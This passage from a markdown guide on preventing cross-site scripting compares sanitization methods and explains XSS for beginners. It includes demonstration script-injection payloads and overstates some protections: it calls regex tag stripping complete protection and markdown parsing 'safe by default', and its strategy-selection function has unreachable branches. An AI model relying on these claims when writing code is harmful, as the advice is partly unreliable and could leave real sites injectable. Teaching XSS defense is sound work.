  '☐ Output properly escaped/sanitized?',
  '☐ No use of eval(), innerHTML, dangerouslySetInnerHTML?',
  '☐ CSP headers configured?',
  '☐ URLs validated before use?',
  '☐ Security tests written?',
  '☐ Automated security scan passed?'
];

// 3. Security champions program
// - Designated security expert on each team
// - Weekly security office hours
// - Monthly security training

// FINAL METRICS (6 months post-incident):
const improvements = {
  xssVulnerabilities: 0,              // Down from 47
  securityIncidents: 0,               // Down from 1 major
  automatedSecurityScans: 'Daily',    // Was: None
  penetrationTests: 'Quarterly',      // Was: Never
  developerSecurityTraining: '100%',  // Was: 0%
  cspCoverage: '100%',                // Was: 0%
  userTrust: '+34%',                  // Recovered from incident
  securityRating: 'A+',               // Was: C- (SecurityScorecard)
  bugBountyProgram: 'Active',         // $50k paid to researchers
  complianceCertifications: ['SOC 2', 'ISO 27001']
};
```

**Key Takeaways:**

1. **Never trust user input**: Always sanitize server-side AND client-side
2. **Defense in depth**: Multiple security layers prevent single point of failure
3. **CSP is critical**: Blocks XSS even if sanitization fails
4. **Automated security**: CI/CD security scans catch issues before production
5. **Monitoring & alerting**: Detect attacks early to minimize damage
6. **Incident response plan**: Prepared team responds faster, reduces impact
7. **Security culture**: Training and awareness prevent vulnerabilities

</details>

<details>
<summary><strong>⚖️ Trade-offs: Sanitization Strategies</strong></summary>

| Strategy | Security | Flexibility | Performance | Use Case |
|----------|----------|-------------|-------------|----------|
| **Strip all HTML** | 🟢 Highest | 🔴 None | 🟢 Fast | Comments, plain text |
| **Escape HTML entities** | 🟢 High | 🟡 Limited | 🟢 Fast | User names, titles |
| **Whitelist tags (DOMPurify)** | 🟢 High | 🟢 Good | 🟡 Medium | Rich text editors |
| **Markdown parsing** | 🟡 Medium | 🟢 Good | 🟡 Medium | Blog posts, documentation |
| **iframe sandbox** | 🟡 Medium | 🟢 Full | 🔴 Slow | User-generated widgets |
| **CSP + Nonces** | 🟢 Highest | 🟡 Limited | 🟢 Fast | Production apps |

**Detailed Comparison:**

```javascript
// 1. STRIP ALL HTML (Safest, least flexible)
function stripHtml(text) {
  return text.replace(/<[^>]*>/g, '');
}

const input = '<b>Hello</b> <script>alert(1)</script>';
stripHtml(input); // "Hello alert(1)" - Safe but loses formatting

// ✅ Pros: 100% XSS protection, fast
// ❌ Cons: No formatting, poor UX


// 2. ESCAPE HTML ENTITIES (Safe, preserves text)
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

escapeHtml(input); // "&lt;b&gt;Hello&lt;/b&gt; ..." - Displays as text

// ✅ Pros: Safe, shows original text
// ❌ Cons: No rich text support


// 3. WHITELIST TAGS WITH DOMPURIFY (Balanced)
const clean = DOMPurify.sanitize(input, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
// "<b>Hello</b> " - Safe, allows some formatting

// ✅ Pros: Secure, supports rich text, customizable
// ❌ Cons: Requires library, slightly slower


// 4. MARKDOWN PARSING (Developer-friendly)
const marked = require('marked');
const input = '**Hello** [link](javascript:alert(1))';
const html = marked.parse(input); // Parses markdown to safe HTML

// ✅ Pros: Clean syntax, safe by default
// ❌ Cons: Users must learn markdown


// 5. IFRAME SANDBOX (Maximum isolation)
<iframe
  sandbox="allow-scripts"
  srcdoc="<script>alert(1)</script>"
></iframe>
// Script runs in isolated context, can't access parent

// ✅ Pros: Complete isolation, allows any content
// ❌ Cons: Slow, complex, poor UX


// 6. CSP + NONCES (Production standard)
// Server:
const nonce = crypto.randomBytes(16).toString('base64');
res.setHeader('Content-Security-Policy', `script-src 'nonce-${nonce}'`);

// HTML:
<script nonce="abc123">console.log('Allowed');</script>

// ✅ Pros: Strongest protection, allows dynamic scripts
// ❌ Cons: Requires server-side nonce generation
```

**Performance Benchmarks** (10,000 iterations):

```javascript
const Benchmark = require('benchmark');
const suite = new Benchmark.Suite;

const input = '<p>Hello <b>world</b>! <script>alert(1)</script></p>';

suite
  .add('Strip HTML', () => {
    input.replace(/<[^>]*>/g, '');
  })
  .add('Escape HTML', () => {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
  })
  .add('DOMPurify', () => {
    DOMPurify.sanitize(input);
  })
  .on('cycle', (event) => {
    console.log(String(event.target));
  })
  .run();

// Results:
// Strip HTML: 2,450,000 ops/sec
// Escape HTML: 1,800,000 ops/sec
// DOMPurify: 85,000 ops/sec

// DOMPurify is 29x slower but still fast enough for production
```

**Decision Matrix:**

```javascript
function chooseSanitizationStrategy(requirements) {
  const {
    needsFormatting,
    userTrust,
    performanceCritical,
    complexity
  } = requirements;

  // No formatting needed → Strip or escape
  if (!needsFormatting) {
    return performanceCritical ? 'strip' : 'escape';
  }

  // Rich text needed → DOMPurify or Markdown
  if (needsFormatting) {
    return userTrust === 'low' ? 'dompurify' : 'markdown';
  }

  // Untrusted complex content → iframe sandbox
  if (complexity === 'high' && userTrust === 'none') {
    return 'iframe-sandbox';
  }

  // Production app → CSP + DOMPurify
  return 'csp-dompurify';
}
```

</details>

<details>
<summary><strong>💬 Explain to Junior: XSS in Simple Terms</strong></summary>

**Simple Explanation:**

Imagine your website is a bulletin board where users can post notes. XSS is like someone posting a note that says "When anyone reads this note, secretly tell me their password."

**The Problem:**

```javascript
// Your code displays user comments:
function showComment(comment) {
  document.getElementById('comments').innerHTML = comment;
}

// Normal user posts:
showComment("I love this site!"); // ✅ Fine

// Attacker posts:
showComment('<script>alert("Hacked!")</script>');
// ❌ Browser executes the script!
```

The browser can't tell the difference between YOUR JavaScript and the ATTACKER'S JavaScript. It just executes everything it finds!

**Real-World Analogy:**

Imagine a restaurant where customers write their own food orders:
- Normal customer: "I'll have a burger"
- Attacker: "I'll have a burger. Also, give me everyone's credit cards."

If the kitchen blindly follows ALL instructions without checking, that's XSS!

**The Fix:**

```javascript
// ✅ SAFE: Treat user input as TEXT, not CODE
function showCommentSafe(comment) {
  const div = document.createElement('div');
  div.textContent = comment; // textContent = treats as text
  document.getElementById('comments').appendChild(div);
}

showCommentSafe('<script>alert("Hacked!")</script>');
// Displays: "<script>alert("Hacked!")</script>" as plain text
// Does NOT execute!
```

**Three Rules to Remember:**

1. **Never trust user input** - Assume everything users send is malicious
2. **Escape output** - Convert `<` to `&lt;` so it displays but doesn't execute
3. **Use safe APIs** - `textContent` instead of `innerHTML`, React's `{}` instead of `dangerouslySetInnerHTML`

**Analogy for a PM:**

"XSS is like allowing customers to write their own receipt. If you don't validate what they write, they could write 'Charge: $0.00' or 'Issue refund: $10,000.' You need to:
1. Limit what they can write (validation)
2. Review what they wrote (sanitization)
3. Print it in a way that can't change prices (escaping)"

**Visual Example:**

```javascript
// Unsafe path (XSS):
User Input → Directly to HTML → Browser executes → 💥 Hacked

// Safe path (No XSS):
User Input → Sanitize/Escape → Display as text → ✅ Safe
```

**Interview Answer Template:**

"XSS is when attackers inject malicious JavaScript into a web page that executes in other users' browsers. There are three types: Stored (saved to database), Reflected (in URL), and DOM-based (client-side).

To prevent XSS, I would:
1. Validate and sanitize ALL user input server-side
2. Use output encoding - textContent instead of innerHTML
3. Implement Content Security Policy headers
4. Use frameworks that auto-escape (React, Vue)
5. Never use eval() or innerHTML with user data

For example, instead of `element.innerHTML = userComment`, I'd use `element.textContent = userComment` or a library like DOMPurify to sanitize HTML if rich text is needed."

</details>

### Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Content Security Policy Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google XSS Game](https://xss-game.appspot.com/) - Practice identifying XSS

---
